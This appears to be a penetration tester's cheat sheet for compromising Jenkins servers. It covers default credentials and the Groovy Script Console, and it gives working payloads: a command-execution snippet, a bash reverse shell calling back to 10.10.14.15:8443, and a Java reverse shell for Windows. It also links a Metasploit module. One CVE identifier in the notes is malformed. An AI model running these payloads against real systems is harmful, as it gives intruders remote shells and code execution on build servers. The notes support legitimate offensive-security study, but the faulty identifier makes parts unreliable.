* Open-source automation server written in Java.
* Often installed on windows machines as a `SYSTEM` account. 
# Discovery and Enumeration
* Runs on Tomcat port 8080 by default
* it can also utilise port 5000 to attack slave servers.
	* This port is used to communicated between masters and slaves,
* Also uses a local database and LDAP.
## Enumeration
* Default installation typically uses Jenkins database to store credentials. 
* Default credentials are `admin:admin`
# Attacking Jenkins 
### Script Console
* Once you have gained access a quick way of achieving command execution is via the [Script Console](https://www.jenkins.io/doc/book/managing/script-console/)
* Located at 
```url
http://<url>:<port>/script
```
* Allows a user to run Apache [Groovy](https://en.wikipedia.org/wiki/Apache_Groovy) Scripts
#### Web Shell:
```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```
#### Reverse Shell: 
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
#### Metasploit Module
https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console/
#### Windows Script:
```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```
#### Java Reverse Shell for windows:
```groovy
String host="<ip>";
int port=<port>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
### Other Vulnerabilities 
#### Jenkins 2.147
* Combines `CVE-2018-19999002` and `CVE-2019-1003000` to achieve pre-authenticated RCE. 
#### Jenkins 2.150.2
* Allows users with JOB creation and BUILD privileges to execute code on the system via Node.js.
* 